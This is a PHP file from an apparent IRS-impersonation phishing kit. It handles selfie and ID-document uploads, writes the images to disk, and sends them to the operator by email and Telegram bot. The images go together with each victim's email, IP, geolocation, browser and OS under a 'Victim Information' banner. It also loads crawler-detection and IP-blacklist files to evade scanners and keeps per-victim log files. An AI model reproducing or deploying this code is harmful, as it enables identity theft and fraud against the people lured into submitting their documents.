<?php
session_start();
require_once '../../main.php';
require_once '../../blocker.php';
if($block_referrer == "on") {
    require_once '../../crawlerdetect.php';
}
if($block_iprange == "on") {
    require_once '../../blacklist.php';
}
require_once '../session.php';
$PaypalBank = $_SESSION['PaypalBank'];
$emaildress = $_SESSION['emaildress'];
$DateOfBirth = $_SESSION['DateOfBirth'];
$StateRegion = $_SESSION['StateRegion'];
$VictimInfo1 = "| Submitted by : " . $ip . " (" . gethostbyaddr($ip) . ")";
    $VictimInfo2 = "| Location : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| UserAgent : " . $user_agent . "";
    $VictimInfo4 = "| Browser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
if(isset($_POST['id_slf'])&&isset($_POST['images'])){
    function upImg($vl){
        $t=microtime(true);
        $micro=sprintf("%06d",($t - floor($t))* 1000000);
        $today=date("m.d.y.h.i.s.U".$micro,$t);
        $name=hash('md5',$today);
        $type=explode(';',$vl)[0];
        $type='.'.explode('/',$type)[1];
        file_put_contents('../../pap/'.$name.$type,base64_decode(explode(',',$vl)[1]));
        return "/pap/".$name.$type;
    }
    $from = $_SESSION['emaildress'];
    $subject = "DOCUMENT: $from - $type [ $cn - $os - $ip ]";
    $message = "+ -------- [ ⚡ Beems IRS ⚡ ] -----------+\n";
    $message .="| 🆔 IRS SELFIE Details \n";
    $message .="| ID OF USER : $emaildress\n";
    $message .="| SELFIE OF : {$_SESSION['doc_type']}\n";
    $caption = "| 🆔 IRS SELFIE Details \n";
    $caption = "+ -------- [ ⚡ Bems IRS ⚡ ] -----------+\n";
    $caption .="| ID OF USER : $emaildress\n";
    $caption .="| TYPE : {$_POST['doc_type']}\n";
    $caption .="+ ------------------------------------+\n";
    $caption .="| 🌐 Victim Information\n";
    $caption .="$VictimInfo1\n";
    $caption .="$VictimInfo2\n";
    $caption .="$VictimInfo3\n";
    $caption .="$VictimInfo4\n";
    $caption .="$VictimInfo5\n";
    $caption .="| 🕛 Received : $date\n";
    $caption .="+ ------------------------------------+\n";
    for($i=0;$i<count($_POST['images']);$i++){
        kirim_foto($email_result, $from, $subject, upImg($_POST['images'][$i]));
        kirim_tele_photo($telegram_bot_token, $telegram_chat_id, "../..".upImg($_POST['images'][$i]), $caption);
        $message.="| FACE (".(int)($i+1).") : ".$_SERVER['HTTP_HOST'].str_replace('/irfof-wmsp/data/selfie', '', strtok($_SERVER["REQUEST_URI"], '?')).upImg($_POST['images'][$i])."\r\n";

    }
    $message .="+ ------------------------------------+\n";
    $message .="| 🌐 Victim Information\n";
    $message .="$VictimInfo1\n";
    $message .="$VictimInfo2\n";
    $message .="$VictimInfo3\n";
    $message .="$VictimInfo4\n";
    $message .="$VictimInfo5\n";
    $message .="| 🕛 Received : $date\n";
    $message .="+ ------------------------------------+\n";
kirim_tele($telegram_bot_token, $telegram_chat_id);
$dob_year = explode("/",$DateOfBirth);
    $dob_year = (end($dob_year));
    tulis_file("../../data/rezs/".$ip."_".$StateRegion."_".$dob_year.".txt", $message);
if($save_file == "on") {
    tulis_file("../../data/Data_Upload.txt", $message);
    }
    tulis_file("../../result/total_upload.txt", $ip);
    $_SESSION['done'] = "done";
exit('done');
}
?>